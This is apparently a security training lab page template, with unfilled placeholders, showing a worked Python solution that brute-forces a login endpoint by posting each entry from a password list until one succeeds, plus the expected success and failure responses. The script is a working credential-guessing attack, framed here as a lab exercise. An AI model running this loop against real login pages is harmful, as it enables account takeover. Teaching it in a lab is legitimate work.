Worked example & response shape
solution.py 
import requests

LAB_URL  = "{{ request.scheme }}://{{ request.get_host }}{{ login_path }}"
USERNAME = "{{ lab.username }}"

with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        r = requests.post(LAB_URL, json={
            "username": USERNAME,
            "password": password,
        })
        print(password, r.status_code)
        if r.json()["success"]:
            print("FOUND:", password)
            break

Each request returns JSON and an HTTP status code:

200  {"success": true,  "message": "Authentication successful", ...}
401  {"success": false, "message": "Invalid credentials", "attempt_number": 4}

No platform login needed in the script — your lab token in the URL is the credential. Just save passwords.txt next to the script and run it.
